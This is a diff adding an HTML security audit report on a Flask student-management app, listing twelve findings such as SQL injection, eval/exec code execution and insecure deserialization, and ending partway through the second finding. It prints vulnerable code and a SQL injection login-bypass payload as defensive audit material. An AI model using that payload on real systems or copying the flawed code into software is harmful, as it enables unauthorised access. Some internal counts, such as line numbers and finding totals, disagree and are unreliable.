@@ -1,0 +1,1026 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Security Audit Report — StudentPortal v1.2.0</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap');
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --red:#ff2d55;--orange:#ff6b35;--amber:#ffaa00;--green:#00c47d;
+  --cyan:#00b8d9;--purple:#7c3aed;--blue:#0a84ff;
+  --bg:#070b14;--surface:#0f1623;--surface2:#16202f;--surface3:#1e2d42;
+  --border:rgba(255,255,255,0.07);--border2:rgba(255,255,255,0.12);
+  --text:#e2e8f0;--muted:#64748b;--sub:#94a3b8;
+}
+html{scroll-behavior:smooth}
+body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);line-height:1.6;font-size:14px}
+
+/* ── PRINT ── */
+@media print{
+  @page { margin: 0; size: A4; }
+  .no-print{display:none!important}
+  body{background:#fff;color:#000;font-size:12px}
+  .cover{background:#1e293b!important;-webkit-print-color-adjust:exact;print-color-adjust:exact}
+  .finding-card{break-inside:avoid;page-break-inside:avoid}
+  section{page-break-before:auto}
+  h2{page-break-after:avoid}
+}
+
+/* ── COVER ── */
+.cover{
+  min-height:100vh;
+  background:linear-gradient(135deg,#070b14 0%,#0f1f3d 50%,#1a0a2e 100%);
+  display:flex;flex-direction:column;justify-content:center;align-items:center;
+  padding:60px 40px;text-align:center;position:relative;overflow:hidden;
+}
+.cover::before{
+  content:'';position:absolute;inset:0;
+  background:
+    radial-gradient(ellipse 70% 50% at 20% 20%,rgba(0,184,217,0.07) 0%,transparent 60%),
+    radial-gradient(ellipse 60% 60% at 80% 80%,rgba(124,58,237,0.07) 0%,transparent 60%);
+}
+.cover-inner{position:relative;z-index:1;max-width:760px}
+.cover-badge{
+  display:inline-flex;align-items:center;gap:8px;
+  padding:6px 18px;border-radius:99px;
+  border:1px solid rgba(255,45,85,0.4);
+  background:rgba(255,45,85,0.08);
+  color:var(--red);font-size:12px;font-weight:700;
+  letter-spacing:1px;text-transform:uppercase;margin-bottom:28px;
+}
+.cover-badge::before{content:'';width:8px;height:8px;border-radius:50%;background:var(--red);box-shadow:0 0 8px var(--red);animation:blink 2s ease-in-out infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
+.cover-logo{font-size:13px;font-weight:600;color:var(--muted);letter-spacing:2px;text-transform:uppercase;margin-bottom:16px}
+.cover-logo span{color:var(--cyan)}
+.cover-title{font-size:42px;font-weight:900;letter-spacing:-1.5px;line-height:1.1;margin-bottom:12px}
+.cover-title .app-name{
+  background:linear-gradient(135deg,var(--cyan),var(--purple));
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;
+}
+.cover-subtitle{font-size:17px;color:var(--sub);margin-bottom:44px}
+.cover-meta-grid{
+  display:grid;grid-template-columns:repeat(3,1fr);gap:16px;
+  margin-bottom:40px;text-align:left;
+}
+.meta-box{
+  background:rgba(255,255,255,0.04);
+  border:1px solid var(--border2);
+  border-radius:10px;padding:14px 18px;
+}
+.meta-box-label{font-size:10px;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:.8px;margin-bottom:4px}
+.meta-box-value{font-size:13px;font-weight:600;color:var(--text)}
+.cover-score-row{
+  display:flex;align-items:center;justify-content:center;gap:28px;
+  padding:20px 32px;
+  background:rgba(255,45,85,0.06);
+  border:1px solid rgba(255,45,85,0.2);
+  border-radius:14px;
+}
+.cover-score-label{font-size:11px;color:var(--sub);text-transform:uppercase;letter-spacing:.8px}
+.cover-score-num{font-size:48px;font-weight:900;color:var(--red);line-height:1}
+.cover-score-grade{font-size:13px;font-weight:700;color:var(--red);background:rgba(255,45,85,.12);padding:3px 12px;border-radius:99px;border:1px solid rgba(255,45,85,.25)}
+.cover-divider{width:1px;height:56px;background:var(--border2)}
+.cover-stat{text-align:center}
+.cover-stat-n{font-size:30px;font-weight:800;line-height:1}
+.cover-stat-l{font-size:10px;font-weight:600;color:var(--muted);text-transform:uppercase;letter-spacing:.5px;margin-top:2px}
+
+/* ── LAYOUT ── */
+.container{max-width:960px;margin:0 auto;padding:60px 32px}
+.section-gap{margin-bottom:64px}
+
+/* ── SECTION HEADER ── */
+.section-num{font-size:11px;font-weight:700;color:var(--cyan);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:8px}
+.section-title{font-size:26px;font-weight:800;letter-spacing:-.5px;margin-bottom:8px}
+.section-line{height:2px;width:48px;background:linear-gradient(90deg,var(--cyan),transparent);margin-bottom:24px}
+.section-lead{font-size:14.5px;color:var(--sub);line-height:1.8;max-width:720px}
+
+/* ── EXECUTIVE SUMMARY ── */
+.exec-grid{display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-top:28px}
+.exec-card{
+  background:var(--surface);border:1px solid var(--border);
+  border-radius:12px;padding:22px 24px;
+}
+.exec-card-title{font-size:11px;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:.8px;margin-bottom:12px}
+.risk-row{display:flex;align-items:center;gap:10px;margin-bottom:8px}
+.risk-bar-wrap{flex:1;height:6px;background:var(--surface3);border-radius:99px;overflow:hidden}
+.risk-bar{height:100%;border-radius:99px}
+.risk-label{font-size:11px;font-weight:600;min-width:60px}
+.risk-count{font-size:12px;font-weight:700;min-width:24px;text-align:right}
+
+/* SVG Donut */
+.donut-wrap{display:flex;align-items:center;gap:24px;margin-top:8px}
+.donut-legend{display:flex;flex-direction:column;gap:8px}
+.legend-item{display:flex;align-items:center;gap:8px;font-size:12px}
+.legend-dot{width:10px;height:10px;border-radius:50%;flex-shrink:0}
+
+/* ── SCOPE TABLE ── */
+.info-table{width:100%;border-collapse:collapse;margin-top:16px}
+.info-table tr{border-bottom:1px solid var(--border)}
+.info-table td{padding:11px 14px;font-size:13px}
+.info-table td:first-child{width:200px;color:var(--muted);font-weight:600}
+.info-table td:last-child code{font-family:'JetBrains Mono',monospace;font-size:12px;background:var(--surface2);padding:2px 8px;border-radius:4px}
+
+/* ── FINDINGS SUMMARY TABLE ── */
+.summary-table{width:100%;border-collapse:collapse;margin-top:20px;border-radius:12px;overflow:hidden;border:1px solid var(--border)}
+.summary-table th{background:var(--surface2);padding:11px 16px;font-size:11px;font-weight:700;text-align:left;text-transform:uppercase;letter-spacing:.6px;color:var(--sub);border-bottom:1px solid var(--border)}
+.summary-table td{padding:11px 16px;font-size:13px;border-bottom:1px solid var(--border);vertical-align:middle}
+.summary-table tr:last-child td{border-bottom:none}
+.summary-table tr:hover td{background:var(--surface2)}
+.sev-badge{display:inline-block;padding:2px 10px;border-radius:4px;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.5px}
+.sev-critical{background:rgba(255,45,85,.15);color:#ff2d55;border:1px solid rgba(255,45,85,.25)}
+.sev-high{background:rgba(255,107,53,.15);color:#ff6b35;border:1px solid rgba(255,107,53,.25)}
+.sev-medium{background:rgba(255,170,0,.15);color:#ffaa00;border:1px solid rgba(255,170,0,.25)}
+.sev-low{background:rgba(0,196,125,.12);color:#00c47d;border:1px solid rgba(0,196,125,.22)}
+.finding-id{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--cyan);font-weight:600}
+td a{color:var(--cyan);text-decoration:none}td a:hover{text-decoration:underline}
+
+/* ── FINDING CARDS ── */
+.finding-card{
+  background:var(--surface);border:1px solid var(--border);
+  border-radius:14px;margin-bottom:28px;overflow:hidden;
+  transition:border-color .2s;
+}
+.finding-card:hover{border-color:var(--border2)}
+.finding-card.crit{border-left:4px solid var(--red)}
+.finding-card.high{border-left:4px solid var(--orange)}
+.finding-card.med {border-left:4px solid var(--amber)}
+.finding-card.low {border-left:4px solid var(--green)}
+
+.fc-header{display:flex;align-items:center;gap:12px;padding:16px 22px;border-bottom:1px solid var(--border);background:var(--surface2)}
+.fc-id{font-family:'JetBrains Mono',monospace;font-size:12px;font-weight:600;color:var(--muted);flex-shrink:0}
+.fc-title{font-size:15px;font-weight:700;flex:1}
+.fc-refs{display:flex;gap:7px;flex-wrap:wrap;margin-left:auto}
+.ref-chip{padding:2px 9px;border-radius:5px;font-size:10.5px;font-weight:600;font-family:'JetBrains Mono',monospace}
+.ref-cwe{background:rgba(0,132,255,.12);color:#60b4ff;border:1px solid rgba(0,132,255,.2)}
+.ref-owasp{background:rgba(124,58,237,.12);color:#b08dff;border:1px solid rgba(124,58,237,.2)}
+
+.fc-body{padding:20px 22px;display:grid;gap:16px}
+.fc-row-label{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.8px;color:var(--muted);margin-bottom:6px}
+.fc-row-text{font-size:13.5px;color:var(--sub);line-height:1.75}
+.fc-row-text.impact{color:#ffc0c0}
+.code-block{
+  background:#070b14;border:1px solid var(--border2);
+  border-radius:8px;padding:14px 16px;
+  font-family:'JetBrains Mono',monospace;font-size:12px;
+  line-height:1.7;color:#e2e8f0;overflow-x:auto;white-space:pre;
+}
+.code-block.vuln{border-color:rgba(255,45,85,.25);background:#130608}
+.code-block.safe {border-color:rgba(0,196,125,.22);background:#060f0a}
+.code-line-num{color:var(--muted);user-select:none;margin-right:12px;min-width:28px;display:inline-block}
+.hl{background:rgba(255,45,85,.18);display:block;margin:0 -16px;padding:0 16px}
+.hl-fix{background:rgba(0,196,125,.15);display:block;margin:0 -16px;padding:0 16px}
+.code-compare{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.code-compare-label{font-size:10px;font-weight:700;margin-bottom:6px}
+.label-bad{color:var(--red)}.label-good{color:var(--green)}
+
+.remediation-list{list-style:none;display:flex;flex-direction:column;gap:7px}
+.remediation-list li{display:flex;gap:9px;font-size:13px;color:var(--sub);line-height:1.6}
+.remediation-list li::before{content:'→';color:var(--cyan);flex-shrink:0;font-weight:700;margin-top:1px}
+
+/* ── OWASP COVERAGE ── */
+.owasp-grid{display:grid;grid-template-columns:repeat(5,1fr);gap:10px;margin-top:20px}
+.owasp-cell{
+  border-radius:8px;padding:10px;text-align:center;
+  border:1px solid var(--border);background:var(--surface2);
+}
+.owasp-cell.hit{border-color:rgba(255,45,85,.3);background:rgba(255,45,85,.07)}
+.owasp-cell-rank{font-size:11px;font-weight:700;margin-bottom:4px;font-family:'JetBrains Mono',monospace}
+.owasp-cell-name{font-size:9.5px;color:var(--muted);line-height:1.3}
+.owasp-cell.hit .owasp-cell-rank{color:var(--red)}
+.owasp-cell.hit .owasp-cell-name{color:var(--sub)}
+.owasp-cell.miss .owasp-cell-rank{color:var(--muted)}
+
+/* ── REMEDIATION ROADMAP ── */
+.roadmap-phase{
+  border:1px solid var(--border);border-radius:12px;
+  overflow:hidden;margin-bottom:16px;
+}
+.roadmap-phase-header{
+  display:flex;align-items:center;gap:12px;
+  padding:14px 20px;
+  border-bottom:1px solid var(--border);
+}
+.phase-num{
+  width:28px;height:28px;border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  font-size:12px;font-weight:800;flex-shrink:0;
+}
+.phase-1{background:rgba(255,45,85,.15);color:var(--red)}
+.phase-2{background:rgba(255,107,53,.15);color:var(--orange)}
+.phase-3{background:rgba(255,170,0,.13);color:var(--amber)}
+.phase-title{font-size:14px;font-weight:700}
+.phase-timeline{margin-left:auto;font-size:11px;font-weight:600;color:var(--muted);background:var(--surface3);padding:3px 10px;border-radius:99px}
+.roadmap-items{padding:14px 20px;display:flex;flex-direction:column;gap:7px}
+.roadmap-item{display:flex;align-items:flex-start;gap:10px;font-size:13px}
+.roadmap-item-id{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--cyan);flex-shrink:0;padding-top:1px;min-width:72px}
+.roadmap-item-text{color:var(--sub);line-height:1.5}
+
+/* ── FOOTER ── */
+.report-footer{
+  border-top:1px solid var(--border);
+  padding:28px 32px;
+  display:flex;align-items:center;justify-content:space-between;
+  font-size:11px;color:var(--muted);
+  margin-top:40px;
+}
+.footer-logo{font-weight:700;font-size:13px;color:var(--sub)}
+.footer-logo span{color:var(--cyan)}
+
+/* ── PRINT BUTTON ── */
+.print-btn{
+  position:fixed;bottom:28px;right:28px;
+  background:linear-gradient(135deg,var(--cyan),var(--purple));
+  border:none;border-radius:99px;
+  color:#fff;font-family:'Inter',sans-serif;font-size:13px;font-weight:700;
+  padding:12px 22px;cursor:pointer;
+  box-shadow:0 8px 24px rgba(0,184,217,.3);
+  transition:all .2s;z-index:50;
+}
+.print-btn:hover{transform:translateY(-2px);box-shadow:0 12px 30px rgba(0,184,217,.4)}
+</style>
+</head>
+<body>
+
+<!-- ═══════════════════ COVER PAGE ═══════════════════ -->
+<div class="cover">
+  <div class="cover-inner">
+    <div class="cover-badge">⚠ Security Audit Report — Confidential</div>
+    <div class="cover-logo">Produced by <span>SecureAudit Pro</span> v2.4 — Static Code Analysis</div>
+    <h1 class="cover-title">
+      <span class="app-name">StudentPortal</span> v1.2.0<br>
+      Security Assessment
+    </h1>
+    <p class="cover-subtitle">Python / Flask Web Application · Source Code Review</p>
+
+    <div class="cover-meta-grid">
+      <div class="meta-box">
+        <div class="meta-box-label">Target Application</div>
+        <div class="meta-box-value">StudentPortal v1.2.0</div>
+      </div>
+      <div class="meta-box">
+        <div class="meta-box-label">Language / Framework</div>
+        <div class="meta-box-value">Python 3.11 / Flask 2.1</div>
+      </div>
+      <div class="meta-box">
+        <div class="meta-box-label">Audit Date</div>
+        <div class="meta-box-value">June 19, 2026</div>
+      </div>
+      <div class="meta-box">
+        <div class="meta-box-label">Source File Audited</div>
+        <div class="meta-box-value">student_portal.py</div>
+      </div>
+      <div class="meta-box">
+        <div class="meta-box-label">Lines of Code</div>
+        <div class="meta-box-value">123 LOC</div>
+      </div>
+      <div class="meta-box">
+        <div class="meta-box-label">Methodology</div>
+        <div class="meta-box-value">SAST + Manual Review</div>
+      </div>
+    </div>
+
+    <div class="cover-score-row">
+      <div class="cover-stat">
+        <div class="cover-score-label">Security Score</div>
+        <div class="cover-score-num">0</div>
+        <div style="margin-top:4px"><span class="cover-score-grade">F — Critical Risk</span></div>
+      </div>
+      <div class="cover-divider"></div>
+      <div class="cover-stat">
+        <div class="cover-score-num" style="color:var(--red);font-size:26px">4</div>
+        <div class="cover-stat-l">Critical</div>
+      </div>
+      <div class="cover-stat">
+        <div class="cover-score-num" style="color:var(--orange);font-size:26px">6</div>
+        <div class="cover-stat-l">High</div>
+      </div>
+      <div class="cover-stat">
+        <div class="cover-score-num" style="color:var(--amber);font-size:26px">2</div>
+        <div class="cover-stat-l">Medium</div>
+      </div>
+      <div class="cover-stat">
+        <div class="cover-score-num" style="color:var(--green);font-size:26px">0</div>
+        <div class="cover-stat-l">Low</div>
+      </div>
+      <div class="cover-divider"></div>
+      <div class="cover-stat">
+        <div class="cover-score-num" style="color:var(--sub);font-size:26px">12</div>
+        <div class="cover-stat-l">Total Findings</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════ BODY ═══════════════════ -->
+<div class="container">
+
+  <!-- ── 1. EXECUTIVE SUMMARY ── -->
+  <div class="section-gap">
+    <div class="section-num">Section 1</div>
+    <h2 class="section-title">Executive Summary</h2>
+    <div class="section-line"></div>
+    <p class="section-lead">
+      A static code security analysis of <strong>StudentPortal v1.2.0</strong> was conducted using
+      SecureAudit Pro's pattern-based engine combined with manual code inspection.
+      The review uncovered <strong>12 distinct vulnerabilities</strong> across the single source file
+      <code style="font-family:'JetBrains Mono',monospace;background:var(--surface2);padding:2px 8px;border-radius:4px">student_portal.py</code>,
+      including 4 Critical severity issues that allow <strong>Remote Code Execution</strong>,
+      <strong>SQL Injection</strong>, and <strong>Insecure Deserialization</strong>.
+      The application is not suitable for production deployment in its current state.
+      Immediate remediation is required before any production exposure.
+    </p>
+
+    <div class="exec-grid">
+      <!-- Risk distribution bar chart -->
+      <div class="exec-card">
+        <div class="exec-card-title">Risk Distribution</div>
+        <div class="risk-row" style="margin-top:8px">
+          <span class="risk-label" style="color:var(--red)">Critical</span>
+          <div class="risk-bar-wrap"><div class="risk-bar" style="width:100%;background:var(--red)"></div></div>
+          <span class="risk-count" style="color:var(--red)">4</span>
+        </div>
+        <div class="risk-row">
+          <span class="risk-label" style="color:var(--orange)">High</span>
+          <div class="risk-bar-wrap"><div class="risk-bar" style="width:62%;background:var(--orange)"></div></div>
+          <span class="risk-count" style="color:var(--orange)">6</span>
+        </div>
+        <div class="risk-row">
+          <span class="risk-label" style="color:var(--amber)">Medium</span>
+          <div class="risk-bar-wrap"><div class="risk-bar" style="width:25%;background:var(--amber)"></div></div>
+          <span class="risk-count" style="color:var(--amber)">2</span>
+        </div>
+        <div class="risk-row">
+          <span class="risk-label" style="color:var(--green)">Low</span>
+          <div class="risk-bar-wrap"><div class="risk-bar" style="width:0%;background:var(--green)"></div></div>
+          <span class="risk-count" style="color:var(--green)">0</span>
+        </div>
+        <div style="margin-top:16px;padding-top:14px;border-top:1px solid var(--border)">
+          <div style="font-size:11px;color:var(--muted);margin-bottom:6px">Score Calculation</div>
+          <code style="font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--sub)">
+            100 − (4×25 + 6×10 + 2×5) = 100 − 170 = <span style="color:var(--red);font-weight:700">0 / 100</span>
+          </code>
+        </div>
+      </div>
+
+      <!-- SVG Donut -->
+      <div class="exec-card">
+        <div class="exec-card-title">Vulnerability Categories</div>
+        <div class="donut-wrap" style="margin-top:12px">
+          <svg width="130" height="130" viewBox="0 0 42 42">
+            <!-- Donut segments (circumference=100 for r=16) -->
+            <circle cx="21" cy="21" r="16" fill="transparent" stroke="#ff2d55" stroke-width="7"
+              stroke-dasharray="36.4 63.6" stroke-dashoffset="0" transform="rotate(-90 21 21)"/>
+            <circle cx="21" cy="21" r="16" fill="transparent" stroke="#ff6b35" stroke-width="7"
+              stroke-dasharray="27.3 72.7" stroke-dashoffset="-36.4" transform="rotate(-90 21 21)"/>
+            <circle cx="21" cy="21" r="16" fill="transparent" stroke="#00c47d" stroke-width="7"
+              stroke-dasharray="18.2 81.8" stroke-dashoffset="-63.7" transform="rotate(-90 21 21)"/>
+            <circle cx="21" cy="21" r="16" fill="transparent" stroke="#ffaa00" stroke-width="7"
+              stroke-dasharray="18.2 81.8" stroke-dashoffset="-81.9" transform="rotate(-90 21 21)"/>
+            <text x="21" y="23" text-anchor="middle" font-size="6" fill="#e2e8f0" font-weight="700">11</text>
+          </svg>
+          <div class="donut-legend">
+            <div class="legend-item"><div class="legend-dot" style="background:var(--red)"></div>Injection (4)</div>
+            <div class="legend-item"><div class="legend-dot" style="background:var(--orange)"></div>Secrets/Auth (3)</div>
+            <div class="legend-item"><div class="legend-dot" style="background:var(--green)"></div>Crypto Failures (2)</div>
+            <div class="legend-item"><div class="legend-dot" style="background:var(--amber)"></div>Misconfiguration (2)</div>
+          </div>
+        </div>
+        <div style="margin-top:14px;padding-top:12px;border-top:1px solid var(--border);font-size:12px;color:var(--muted)">
+          Unique OWASP categories hit: <strong style="color:var(--sub)">6 / 10</strong>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── 2. SCOPE & METHODOLOGY ── -->
+  <div class="section-gap">
+    <div class="section-num">Section 2</div>
+    <h2 class="section-title">Scope &amp; Methodology</h2>
+    <div class="section-line"></div>
+
+    <table class="info-table">
+      <tr><td>Application Name</td><td>StudentPortal — Student Management Web System</td></tr>
+      <tr><td>Application Type</td><td>Web Application (REST API + HTML forms)</td></tr>
+      <tr><td>Source File</td><td><code>student_portal.py</code></td></tr>
+      <tr><td>Language</td><td>Python 3.11</td></tr>
+      <tr><td>Framework</td><td>Flask 2.1.3</td></tr>
+      <tr><td>Database</td><td>SQLite3 (via <code>sqlite3</code> stdlib)</td></tr>
+      <tr><td>LOC Reviewed</td><td>123 lines</td></tr>
+      <tr><td>Endpoints Identified</td><td>9 HTTP endpoints across GET / POST methods</td></tr>
+      <tr><td>Audit Methodology</td><td>SAST (pattern-based static analysis) + manual code inspection</td></tr>
+      <tr><td>Tools Used</td><td>SecureAudit Pro v2.4 — Client-side static analysis engine</td></tr>
+      <tr><td>Standards Referenced</td><td>OWASP Top 10 (2021), CWE/SANS Top 25, NIST SP 800-53</td></tr>
+      <tr><td>Audit Date</td><td>June 19, 2026</td></tr>
+      <tr><td>Report Classification</td><td>CONFIDENTIAL — Internal Use Only</td></tr>
+    </table>
+
+    <div style="margin-top:24px;background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:18px 22px">
+      <div style="font-size:11px;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:.8px;margin-bottom:10px">Analysis Process</div>
+      <div style="display:flex;gap:0;position:relative">
+        <div style="position:absolute;top:18px;left:18px;right:18px;height:2px;background:linear-gradient(90deg,var(--cyan),var(--purple));opacity:.3;z-index:0"></div>
+        <div style="display:grid;grid-template-columns:repeat(5,1fr);gap:8px;width:100%;position:relative;z-index:1">
+          <div style="text-align:center">
+            <div style="width:36px;height:36px;border-radius:50%;background:rgba(0,184,217,.12);border:1px solid var(--cyan);display:flex;align-items:center;justify-content:center;margin:0 auto 6px;font-size:14px">📂</div>
+            <div style="font-size:10px;font-weight:600;color:var(--sub)">Load Source</div>
+          </div>
+          <div style="text-align:center">
+            <div style="width:36px;height:36px;border-radius:50%;background:rgba(0,184,217,.12);border:1px solid var(--cyan);display:flex;align-items:center;justify-content:center;margin:0 auto 6px;font-size:14px">🔍</div>
+            <div style="font-size:10px;font-weight:600;color:var(--sub)">Pattern Match</div>
+          </div>
+          <div style="text-align:center">
+            <div style="width:36px;height:36px;border-radius:50%;background:rgba(0,184,217,.12);border:1px solid var(--cyan);display:flex;align-items:center;justify-content:center;margin:0 auto 6px;font-size:14px">🗂️</div>
+            <div style="font-size:10px;font-weight:600;color:var(--sub)">CWE/OWASP Map</div>
+          </div>
+          <div style="text-align:center">
+            <div style="width:36px;height:36px;border-radius:50%;background:rgba(0,184,217,.12);border:1px solid var(--cyan);display:flex;align-items:center;justify-content:center;margin:0 auto 6px;font-size:14px">⚖️</div>
+            <div style="font-size:10px;font-weight:600;color:var(--sub)">Risk Rating</div>
+          </div>
+          <div style="text-align:center">
+            <div style="width:36px;height:36px;border-radius:50%;background:rgba(0,184,217,.12);border:1px solid var(--cyan);display:flex;align-items:center;justify-content:center;margin:0 auto 6px;font-size:14px">📋</div>
+            <div style="font-size:10px;font-weight:600;color:var(--sub)">Report</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── 3. FINDINGS SUMMARY ── -->
+  <div class="section-gap">
+    <div class="section-num">Section 3</div>
+    <h2 class="section-title">Findings Summary</h2>
+    <div class="section-line"></div>
+    <p class="section-lead">All findings are ranked by severity. Click an ID to jump to the detailed finding.</p>
+
+    <table class="summary-table">
+      <thead>
+        <tr>
+          <th>ID</th>
+          <th>Vulnerability</th>
+          <th>Severity</th>
+          <th>CWE</th>
+          <th>OWASP</th>
+          <th>Affected Endpoint</th>
+          <th>Line</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr><td><a href="#F01" class="finding-id">F-01</a></td><td>SQL Injection via String Concatenation</td><td><span class="sev-badge sev-critical">Critical</span></td><td>CWE-89</td><td>A03:2021</td><td>/login</td><td>46–48</td></tr>
+        <tr><td><a href="#F02" class="finding-id">F-02</a></td><td>Remote Code Execution via eval()</td><td><span class="sev-badge sev-critical">Critical</span></td><td>CWE-95</td><td>A03:2021</td><td>/calculate</td><td>81</td></tr>
+        <tr><td><a href="#F03" class="finding-id">F-03</a></td><td>Remote Code Execution via exec()</td><td><span class="sev-badge sev-critical">Critical</span></td><td>CWE-95</td><td>A03:2021</td><td>/run-script</td><td>94</td></tr>
+        <tr><td><a href="#F04" class="finding-id">F-04</a></td><td>Insecure Deserialization via pickle.loads()</td><td><span class="sev-badge sev-critical">Critical</span></td><td>CWE-502</td><td>A08:2021</td><td>/upload-profile</td><td>107</td></tr>
+        <tr><td><a href="#F05" class="finding-id">F-05</a></td><td>Command Injection — subprocess(shell=True)</td><td><span class="sev-badge sev-high">High</span></td><td>CWE-78</td><td>A03:2021</td><td>/generate-report</td><td>121–122</td></tr>
+        <tr><td><a href="#F06" class="finding-id">F-06</a></td><td>OS Command Injection via os.system()</td><td><span class="sev-badge sev-high">High</span></td><td>CWE-78</td><td>A03:2021</td><td>/ping</td><td>135</td></tr>
+        <tr><td><a href="#F07" class="finding-id">F-07</a></td><td>Hardcoded Credentials (4 instances)</td><td><span class="sev-badge sev-high">High</span></td><td>CWE-798</td><td>A07:2021</td><td>Global scope</td><td>19–25</td></tr>
+        <tr><td><a href="#F08" class="finding-id">F-08</a></td><td>Weak Password Hashing (MD5)</td><td><span class="sev-badge sev-high">High</span></td><td>CWE-327</td><td>A02:2021</td><td>/login</td><td>52</td></tr>
+        <tr><td><a href="#F09" class="finding-id">F-09</a></td><td>Insecure YAML Deserialization</td><td><span class="sev-badge sev-high">High</span></td><td>CWE-502</td><td>A08:2021</td><td>/import-config</td><td>148</td></tr>
+        <tr><td><a href="#F10" class="finding-id">F-10</a></td><td>TLS Certificate Verification Disabled</td><td><span class="sev-badge sev-high">High</span></td><td>CWE-295</td><td>A02:2021</td><td>/proxy</td><td>161</td></tr>
+        <tr><td><a href="#F11" class="finding-id">F-11</a></td><td>Insecure PRNG for Session Tokens</td><td><span class="sev-badge sev-medium">Medium</span></td><td>CWE-338</td><td>A02:2021</td><td>/login</td><td>57</td></tr>
+        <tr><td><a href="#F12" class="finding-id">F-12</a></td><td>Debug Mode + Exposed Host (0.0.0.0)</td><td><span class="sev-badge sev-medium">Medium</span></td><td>CWE-94</td><td>A05:2021</td><td>App Entry</td><td>181</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <!-- ── 4. DETAILED FINDINGS ── -->
+  <div class="section-gap">
+    <div class="section-num">Section 4</div>
+    <h2 class="section-title">Detailed Findings</h2>
+    <div class="section-line"></div>
+
+    <!-- F-01 -->
+    <div class="finding-card crit" id="F01">
+      <div class="fc-header">
+        <span class="fc-id">F-01</span>
+        <span class="sev-badge sev-critical">Critical</span>
+        <span class="fc-title">SQL Injection via String Concatenation</span>
+        <div class="fc-refs">
+          <span class="ref-chip ref-cwe">CWE-89</span>
+          <span class="ref-chip ref-owasp">A03:2021 Injection</span>
+        </div>
+      </div>
+      <div class="fc-body">
+        <div>
+          <div class="fc-row-label">Affected Location</div>
+          <div class="fc-row-text"><code style="font-family:'JetBrains Mono',monospace;color:var(--cyan)">student_portal.py</code> — Function <code style="font-family:'JetBrains Mono',monospace;color:var(--cyan)">login()</code> — Lines 46–48</div>
+        </div>
+        <div>
+          <div class="fc-row-label">Vulnerable Code</div>
+          <div class="code-block vuln"><span class="code-line-num">44</span>username = request.form.get('username', '')
+<span class="code-line-num">45</span>password = request.form.get('password', '')
+<span class="code-line-num">46</span>conn = get_db()
+<span class="code-line-num">47</span>cursor = conn.cursor()
+<span class="hl"><span class="code-line-num">48</span>query = "SELECT * FROM users WHERE username='" + username + \
+<span class="code-line-num">49</span>        "' AND password='" + password + "'"
+<span class="code-line-num">50</span>cursor.execute(query)</span></div>
+        </div>
+        <div>
+          <div class="fc-row-label">Description</div>
+          <div class="fc-row-text">The <code style="font-family:'JetBrains Mono',monospace">login()</code> endpoint constructs the SQL query by directly concatenating unsanitised HTTP form parameters into the query string. An attacker who submits <code style="font-family:'JetBrains Mono',monospace;color:#ff9999">' OR '1'='1</code> as the username will authenticate without a valid password, bypassing all authentication logic.</div>
+        </div>
+        <div>
+          <div class="fc-row-label">Proof of Concept</div>
+          <div class="code-block vuln">POST /login
+username=admin' OR '1'='1' --&password=anything
+
+# Resulting query (always TRUE):
+SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='...'</div>
+        </div>
+        <div>
+          <div class="fc-row-label">Impact</div>
+          <div class="fc-row-text impact">Authentication bypass for any user account. Full read/write/delete access to all student records. Potential for database schema exfiltration via UNION-based injection. On SQLite, combined with other vulns, may escalate to file system access.</div>
+        </div>
+        <div>
+          <div class="fc-row-label">Remediation</div>
+          <ul class="remediation-list">
+            <li>Replace string concatenation with SQLite3 parameterized queries using <code style="font-family:'JetBrains Mono',monospace">?</code> placeholders.</li>
+            <li>Never interpolate any user input directly into a SQL string.</li>
+            <li>Consider an ORM (SQLAlchemy) which uses parameterized queries by default.</li>
+            <li>Add server-side input validation: enforce max length, allowed characters.</li>
+          </ul>
+        </div>
+        <div>
+          <div class="fc-row-label">Secure Code Example</div>
+          <div class="code-block safe"><span class="hl-fix"><span class="code-line-num">47</span># Secure: parameterized query — user input is always data, never SQL
+<span class="code-line-num">48</span>cursor.execute(
+<span class="code-line-num">49</span>    "SELECT * FROM users WHERE username = ? AND password = ?",
+<span class="code-line-num">50</span>    (username, hashed_pw)   # pass as a tuple, NOT in the string
+<span class="code-line-num">51</span>)</span></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- F-02 -->
+    <div class="finding-card crit" id="F02">
+      <div class="fc-header">
+        <span class="fc-id">F-02</span>
+        <span class="sev-badge sev-critical">Critical</span>
+        <span class="fc-title">Remote Code Execution via eval()</span>
+        <div class="fc-refs">
+          <span class="ref-chip ref-cwe">CWE-95</span>
+          <span class="ref-chip ref-owasp">A03:2021 Injection</span>
+        </div>
+      </div>
+      <div class="fc-body">
+        <div>
+          <div class="fc-row-label">Affected Location</div>
+          <div class="fc-row-text"><code style="font-family:'JetBrains Mono',monospace;color:var(--cyan)">calculate()</code> — Line 81</div>
+        </div>
+        <div>
+          <div class="fc-row-label">Vulnerable Code</div>
+          <div class="code-block vuln"><span class="code-line-num">79</span>def calculate():
+<span class="code-line-num">80</span>    expression = request.form.get('expression', '')
